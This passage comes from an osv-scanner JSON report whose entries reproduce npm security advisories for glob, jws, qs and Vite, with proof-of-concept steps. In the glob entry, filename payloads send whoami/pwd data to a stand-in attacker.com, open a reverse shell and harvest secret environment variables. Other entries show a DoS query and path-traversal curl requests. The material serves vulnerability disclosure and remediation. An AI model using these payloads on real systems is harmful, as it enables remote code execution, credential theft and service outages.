When `glob -c <command> <patterns>` is used, matched filenames are passed to a shell with `shell: true`, enabling shell metacharacters in filenames to trigger command injection and achieve arbitrary code execution under the user or CI account privileges.\n\n### Details\n\n**Root Cause:**\nThe vulnerability exists in `src/bin.mts:277` where the CLI collects glob matches and executes the supplied command using `foregroundChild()` with `shell: true`:\n\n```javascript\nstream.on('end', () => foregroundChild(cmd, matches, { shell: true }))\n```\n\n**Technical Flow:**\n1. User runs `glob -c <command> <pattern>` \n2. CLI finds files matching the pattern\n3. Matched filenames are collected into an array\n4. Command is executed with matched filenames as arguments using `shell: true`\n5. Shell interprets metacharacters in filenames as command syntax\n6. Malicious filenames execute arbitrary commands\n\n**Affected Component:**\n- **CLI Only:** The vulnerability affects only the command-line interface\n- **Library Safe:** The core glob library API (`glob()`, `globSync()`, streams/iterators) is not affected\n- **Shell Dependency:** Exploitation requires shell metacharacter support (primarily POSIX systems)\n\n**Attack Surface:**\n- Files with names containing shell metacharacters: `$()`, backticks, `;`, `&`, `|`, etc.\n- Any directory where attackers can control filenames (PR branches, archives, user uploads)\n- CI/CD pipelines using `glob -c` on untrusted content\n\n### PoC\n\n**Setup Malicious File:**\n```bash\nmkdir test_directory && cd test_directory\n\n# Create file with command injection payload in filename\ntouch '$(touch injected_poc)'\n```\n\n**Trigger Vulnerability:**\n```bash\n# Run glob CLI with -c option\nnode /path/to/glob/dist/esm/bin.mjs -c echo \"**/*\"\n```\n\n**Result:**\n- The echo command executes normally\n- **Additionally:** The `$(touch injected_poc)` in the filename is evaluated by the shell\n- A new file `injected_poc` is created, proving command execution\n- Any command can be injected this way with full user privileges\n\n**Advanced Payload Examples:**\n\n**Data Exfiltration:**\n```bash\n# Filename: $(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)\ntouch '$(curl -X POST https://attacker.com/exfil -d \"$(whoami):$(pwd)\" > /dev/null 2>&1)'\n```\n\n**Reverse Shell:**\n```bash\n# Filename: $(bash -i >& /dev/tcp/attacker.com/4444 0>&1)\ntouch '$(bash -i >& /dev/tcp/attacker.com/4444 0>&1)'\n```\n\n**Environment Variable Harvesting:**\n```bash\n# Filename: $(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)\ntouch '$(env | grep -E \"(TOKEN|KEY|SECRET)\" > /tmp/secrets.txt)'\n```\n\n### Impact\n\n**Arbitrary Command Execution:**\n- Commands execute with full privileges of the user running glob CLI\n- No privilege escalation required - runs as current user\n- Access to environment variables, file system, and network\n\n**Real-World Attack Scenarios:**\n\n**1. CI/CD Pipeline Compromise:**\n- Malicious PR adds files with crafted names to repository\n- CI pipeline uses `glob -c` to process files (linting, testing, deployment)\n- Commands execute in CI environment with build secrets and deployment credentials\n- Potential for supply chain compromise through artifact tampering\n\n**2. Developer Workstation Attack:**\n- Developer clones repository or extracts archive containing malicious filenames\n- Local build scripts use `glob -c` for file processing\n- Developer machine compromise with access to SSH keys, tokens, local services\n\n**3. Automated Processing Systems:**\n- Services using glob CLI to process uploaded files or external content\n- File uploads with malicious names trigger command execution\n- Server-side compromise with potential for lateral movement\n\n**4. Supply Chain Poisoning:**\n- Malicious packages or themes include files with crafted names\n- Build processes using glob CLI automatically process these files\n- Wide distribution of compromise through package ecosystems\n\n**Platform-Specific Risks:**\n- **POSIX/Linux/macOS:** High risk due to flexible filename characters and shell parsing\n- **Windows:** Lower risk due to filename restrictions, but vulnerability persists with PowerShell, Git Bash, WSL\n- **Mixed Environments:** CI systems often use Linux containers regardless of developer platform\n\n### Affected Products\n\n- **Ecosystem:** npm\n- **Package name:** glob\n- **Component:** CLI only (`src/bin.mts`)\n- **Affected versions:** v10.2.0 through v11.0.3 (and likely later versions until patched)\n- **Introduced:** v10.2.0 (first release with CLI containing `-c/--cmd` option)\n- **Patched versions:** 11.1.0and 10.5.0\n\n**Scope Limitation:**\n- **Library API Not Affected:** Core glob functions (`glob()`, `globSync()`, async iterators) are safe\n- **CLI-Specific:** Only the command-line interface with `-c/--cmd` option is vulnerable\n\n### Remediation\n\n- Upgrade to `glob@10.5.0`, `glob@11.1.0`, or higher, as soon as possible.\n- If any `glob` CLI actions fail, then convert commands containing positional arguments, to use the `--cmd-arg`/`-g` option instead.\n- As a last resort, use `--shell` to maintain `shell:true` behavior until glob v12, but take care to ensure that no untrusted contents can possibly be encountered in the file path results.","references":[{"type":"WEB","url":"https://github.com/isaacs/node-glob/security/advisories/GHSA-5j98-mcp5-4vw2"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-64756"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/1e4e297342a09f2aa0ced87fcd4a70ddc325d75f"},{"type":"WEB","url":"https://github.com/isaacs/node-glob/commit/47473c046b91c67269df7a66eab782a6c2716146"},{"type":"PACKAGE","url":"https://github.com/isaacs/node-glob"}],"aliases":["CVE-2025-64756"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-31T02:12:51.081Z"}},{"id":"GHSA-869p-cjfg-cm3x@jws-3.2.2","package":{"name":"jws","version":"3.2.2","ecosystem":"npm","purl":"pkg:npm/jws"},"severity":{"level":"high","type":"CVSS_V3","vector":"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:H/A:N"},"affectedVersions":{"ranges":[{"introduced":"0","fixed":"3.2.3"}]},"fix":{"available":true,"version":"3.2.3","requiresMajorUpdate":false},"details":{"title":"auth0/node-jws Improperly Verifies HMAC Signature","description":"### Overview\nAn improper signature verification vulnerability exists when using auth0/node-jws with the HS256 algorithm under specific conditions.\n\n### Am I Affected?\nYou are affected by this vulnerability if you meet all of the following preconditions:\n\n1.

Applications using `arrayLimit` for DoS protection are vulnerable.\n\n### Details\n\nThe `arrayLimit` option only checks limits for indexed notation (`a[0]=1&a[1]=2`) but completely bypasses it for bracket notation (`a[]=1&a[]=2`).\n\n**Vulnerable code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Working code** (`lib/parse.js:175`):\n```javascript\nelse if (index <= options.arrayLimit) {  // Limit checked here\n    obj = [];\n    obj[index] = leaf;\n}\n```\n\nThe bracket notation handler at line 159 uses `utils.combine([], leaf)` without validating against `options.arrayLimit`, while indexed notation at line 175 checks `index <= options.arrayLimit` before creating arrays.\n\n### PoC\n\n**Test 1 - Basic bypass:**\n```bash\nnpm install qs\n```\n\n```javascript\nconst qs = require('qs');\nconst result = qs.parse('a[]=1&a[]=2&a[]=3&a[]=4&a[]=5&a[]=6', { arrayLimit: 5 });\nconsole.log(result.a.length);  // Output: 6 (should be max 5)\n```\n\n**Test 2 - DoS demonstration:**\n```javascript\nconst qs = require('qs');\nconst attack = 'a[]=' + Array(10000).fill('x').join('&a[]=');\nconst result = qs.parse(attack, { arrayLimit: 100 });\nconsole.log(result.a.length);  // Output: 10000 (should be max 100)\n```\n\n**Configuration:**\n- `arrayLimit: 5` (test 1) or `arrayLimit: 100` (test 2)\n- Use bracket notation: `a[]=value` (not indexed `a[0]=value`)\n\n### Impact\n\nDenial of Service via memory exhaustion. Affects applications using `qs.parse()` with user-controlled input and `arrayLimit` for protection.\n\n**Attack scenario:**\n1. Attacker sends HTTP request: `GET /api/search?filters[]=x&filters[]=x&...&filters[]=x` (100,000+ times)\n2. Application parses with `qs.parse(query, { arrayLimit: 100 })`\n3. qs ignores limit, parses all 100,000 elements into array\n4. Server memory exhausted → application crashes or becomes unresponsive\n5. Service unavailable for all users\n\n**Real-world impact:**\n- Single malicious request can crash server\n- No authentication required\n- Easy to automate and scale\n- Affects any endpoint parsing query strings with bracket notation\n\n### Suggested Fix\n\nAdd `arrayLimit` validation to the bracket notation handler. The code already calculates `currentArrayLength` at line 147-151, but it's not used in the bracket notation handler at line 159.\n\n**Current code** (`lib/parse.js:159-162`):\n```javascript\nif (root === '[]' && options.parseArrays) {\n    obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n        ? []\n        : utils.combine([], leaf);  // No arrayLimit check\n}\n```\n\n**Fixed code**:\n```javascript\nif (root === '[]' && options.parseArrays) {\n    // Use currentArrayLength already calculated at line 147-151\n    if (options.throwOnLimitExceeded && currentArrayLength >= options.arrayLimit) {\n        throw new RangeError('Array limit exceeded. Only ' + options.arrayLimit + ' element' + (options.arrayLimit === 1 ? '' : 's') + ' allowed in an array.');\n    }\n    \n    // If limit exceeded and not throwing, convert to object (consistent with indexed notation behavior)\n    if (currentArrayLength >= options.arrayLimit) {\n        obj = options.plainObjects ? { __proto__: null } : {};\n        obj[currentArrayLength] = leaf;\n    } else {\n        obj = options.allowEmptyArrays && (leaf === '' || (options.strictNullHandling && leaf === null))\n            ?

The viteServePublicMiddleware function [checks if the publicFiles variable is defined](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L111), and then uses it to determine if the requested page is public. In the case that the publicFiles is undefined, the code will treat the requested page as a public page, and go on with the serving function. [publicFiles may be undefined if there is a symbolic link anywhere inside the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/publicDir.ts#L21). In that case, every requested page will be passed to the public serving function. The serving function is based on the [sirv](https://github.com/lukeed/sirv) library. Vite patches the library to add the possibility to test loading access to pages, but when the public page middleware [disables this functionality](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L89) since public pages are meant to be available always, regardless of whether they are in the allow or deny list.\n\nIn the case of public pages, the serving function is [provided with the path to the public directory](https://github.com/vitejs/vite/blob/9719497adec4ad5ead21cafa19a324bb1d480194/packages/vite/src/node/server/middlewares/static.ts#L85) as a root directory. The code of the sirv library [uses the join function to get the full path to the requested file](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L42). For example, if the public directory is \"/www/public\", and the requested file is \"myfile\", the code will join them to the string \"/www/public/myfile\". The code will then pass this string to the normalize function. Afterwards, the code will [use the string's startsWith function](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L43) to determine whether the created path is within the given directory or not. Only if it is, it will be served.\n\nSince [sirv trims the trailing slash of the public directory](https://github.com/lukeed/sirv/blob/d061616827dd32d53b61ec9530c9445c8f592620/packages/sirv/index.mjs#L119), the string's startsWith function may return true even if the created path is not within the public directory. For example, if the server's root is at \"/www\", and the public directory is at \"/www/p\", if the created path will be \"/www/private.txt\", the startsWith function will still return true, because the string \"/www/private.txt\" starts with  \"/www/p\". To achieve this, the attacker will use \"..\" to ask for the file \"../private.txt\". The code will then join it to the \"/www/p\" string, and will receive \"/www/p/../private.txt\". Then, the normalize function will return \"/www/private.txt\", which will then be passed to the startsWith function, which will return true, and the processing of the page will continue without checking the deny list (since this is the public directory middleware which doesn't check that).\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\nmkdir p\ncd p\nln -s a b\ncd ..\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({publicDir: path.resolve(__dirname, \"p/\"), server: {fs: {deny: [path.resolve(__dirname, \"private.txt\")]}}})' > vite.config.js\necho  \"secret\" > private.txt\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/private.txt'`\n\nYou will receive a 403 HTTP Response,  because private.txt is denied.\n\nNow in the same shell run the following command:\n\n`curl -v --path-as-is 'http://localhost:5173/../private.txt'`\n\nYou will receive the contents of private.txt.\n\n### Related links\n- https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb","references":[{"type":"WEB","url":"https://github.com/vitejs/vite/security/advisories/GHSA-g4jq-h2w9-997c"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-58751"},{"type":"WEB","url":"https://github.com/lukeed/sirv/commit/f0113f3f8266328d804ee808f763a3c11f8997eb"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/09f2b52e8d5907f26602653caf41b3a56692600d"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/4f1c35bcbb5830290c694aa14b6789e07450f069"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/63e2a5d232218f3f8d852056751e609a5367aaec"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/e11d24008b97d4ca731ecc1a3b95260a6d12e7e0"},{"type":"PACKAGE","url":"https://github.com/vitejs/vite"}],"aliases":["CVE-2025-58751"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-31T02:12:51.086Z"}},{"id":"GHSA-jqfw-vq24-v9c3@vite-5.4.19","package":{"name":"vite","version":"5.4.19","ecosystem":"npm","purl":"pkg:npm/vite"},"severity":{"level":"low","type":"CVSS_V4","vector":"CVSS:4.0/AV:N/AC:L/AT:P/PR:N/UI:P/VC:L/VI:N/VA:N/SC:N/SI:N/SA:N"},"affectedVersions":{"ranges":[{"introduced":"7.1.0","fixed":"7.1.5"}]},"fix":{"available":true,"version":"7.1.5","requiresMajorUpdate":true},"details":{"title":"Vite's `server.fs` settings were not applied to HTML files","description":"### Summary\nAny HTML files on the machine were served regardless of the `server.fs` settings.\n\n### Impact\n\nOnly apps that match the following conditions are affected:\n\n- explicitly exposes the Vite dev server to the network (using --host or [server.host config option](https://vitejs.dev/config/server-options.html#server-host))\n- `appType: 'spa'` (default) or `appType: 'mpa'` is used\n\nThis vulnerability also affects the preview server.

They just find the file and send back its contents to the client.\n\n### PoC\nExecute the following shell commands:\n\n```\nnpm  create  vite@latest\ncd vite-project/\necho  \"secret\" > /tmp/secret.html\nnpm install\nnpm run dev\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/../../../../../../../../../../../tmp/secret.html'`\n\nThe contents of /tmp/secret.html will be returned.\n\nThis will also work for HTML files that are in the root directory of the project, but are in the deny list (or not in the allow list). Test that by stopping the running server (CTRL+C), and running the following commands in the server's shell:\n\n```\necho  'import path from \"node:path\"; import { defineConfig } from \"vite\"; export default defineConfig({server: {fs: {deny: [path.resolve(__dirname, \"secret_files/*\")]}}})'  >  [vite.config.js](http://vite.config.js)\nmkdir secret_files\necho \"secret txt\" > secret_files/secret.txt\necho \"secret html\" > secret_files/secret.html\nnpm run dev\n\n```\n\nThen, in a different shell, run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.txt'`\n\nYou will receive a 403 HTTP Response,  because everything in the secret_files directory is denied.\n\nNow in the same shell run the following command:\n\n`curl  -v  --path-as-is  'http://localhost:5173/secret_files/secret.html'`\n\nYou will receive the contents of secret_files/secret.html.","references":[{"type":"WEB","url":"https://github.com/vitejs/vite/security/advisories/GHSA-jqfw-vq24-v9c3"},{"type":"ADVISORY","url":"https://nvd.nist.gov/vuln/detail/CVE-2025-58752"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/0ab19ea9fcb66f544328f442cf6e70f7c0528d5f"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/14015d794f69accba68798bd0e15135bc51c9c1e"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/482000f57f56fe6ff2e905305100cfe03043ddea"},{"type":"WEB","url":"https://github.com/vitejs/vite/commit/6f01ff4fe072bcfcd4e2a84811772b818cd51fe6"},{"type":"PACKAGE","url":"https://github.com/vitejs/vite"},{"type":"WEB","url":"https://github.com/vitejs/vite/blob/v7.1.5/packages/vite/CHANGELOG.md"}],"aliases":["CVE-2025-58752"]},"source":{"scanner":"osv-scanner","scannedAt":"2026-01-31T02:12:51.087Z"}}],"metadata":{"vulnerabilities":{"info":0,"low":5,"moderate":6,"high":3,"critical":0}}}}
